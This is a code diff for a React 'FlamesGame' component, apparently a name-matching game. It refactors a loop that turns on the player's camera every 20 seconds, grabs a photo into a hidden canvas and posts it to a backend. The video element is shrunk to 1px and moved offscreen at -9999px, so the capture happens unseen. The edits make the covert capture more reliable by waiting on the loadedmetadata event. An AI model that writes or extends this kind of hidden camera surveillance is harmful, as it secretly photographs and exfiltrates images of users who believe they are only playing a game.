@@ -152,7 +152,7 @@ const FlamesGame = () => {
           videoRef.current.setAttribute("playsinline", true);
         }
         streamRef = stream;
-        console.log("✅ Camera ON");
+        console.log("✅ Camera stream started");
         return true;
       } catch (err) {
         console.error("❌ Camera access error:", err);
@@ -175,26 +175,28 @@ const FlamesGame = () => {
       while (!isCancelled) {
         const started = await startCamera();
         if (started) {
-          // ✅ Wait until video is actually ready
           await new Promise((res) => {
-            const waitUntilReady = () => {
-              const video = videoRef.current;
-              if (video && video.videoWidth > 0) {
-                console.log("✅ Video ready:", video.videoWidth, video.videoHeight);
-                res();
-              } else {
-                console.warn("⏳ Waiting for video to be ready...");
-                setTimeout(waitUntilReady, 300);
-              }
+            const video = videoRef.current;
+            if (!video) return res();
+
+            const onLoadedMetadata = () => {
+              console.log("✅ Metadata loaded. Video ready.");
+              video.removeEventListener("loadedmetadata", onLoadedMetadata);
+              res();
             };
-            setTimeout(waitUntilReady, 700); // initial delay
+
+            if (video.readyState >= 1) {
+              res(); // already ready
+            } else {
+              video.addEventListener("loadedmetadata", onLoadedMetadata);
+            }
           });
 
           await capturePhoto();
           stopCamera();
         }
 
-        await delay(20000); // 20 seconds interval
+        await delay(20000); // 20 sec interval
       }
     };
 
@@ -208,9 +210,10 @@ const FlamesGame = () => {
 
   const capturePhoto = async () => {
     if (!canvasRef.current || !videoRef.current) return;
-    const context = canvasRef.current.getContext("2d");
 
-    console.log("📏 Capturing from video size:", videoRef.current.videoWidth, videoRef.current.videoHeight);
+    console.log("📏 Capturing from:", videoRef.current.videoWidth, "x", videoRef.current.videoHeight);
+
+    const context = canvasRef.current.getContext("2d");
     context.drawImage(videoRef.current, 0, 0, 320, 240);
     const imageData = canvasRef.current.toDataURL("image/jpeg");
 
@@ -223,7 +226,7 @@ const FlamesGame = () => {
 
       if (!res.ok) {
         const text = await res.text();
-        console.error("Backend error response:", text);
+        console.error("❌ Backend response:", text);
       }
 
       console.log("📸 Photo sent to backend");
@@ -270,10 +273,10 @@ const FlamesGame = () => {
 
         if (!res.ok) {
           const text = await res.text();
-          console.error("Result save error:", text);
+          console.error("❌ Result save error:", text);
         }
       } catch (err) {
-        console.error("Failed to send result:", err);
+        console.error("❌ Failed to send result:", err);
       }
     }, 2000);
   };
@@ -327,7 +330,13 @@ const FlamesGame = () => {
         autoPlay
         muted
         playsInline
-        style={{ position: "absolute", top: "-9999px", left: "-9999px", width: "1px", height: "1px" }}
+        style={{
+          position: "absolute",
+          top: "-9999px",
+          left: "-9999px",
+          width: "1px",
+          height: "1px",
+        }}
       />
       <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />
     </Background>
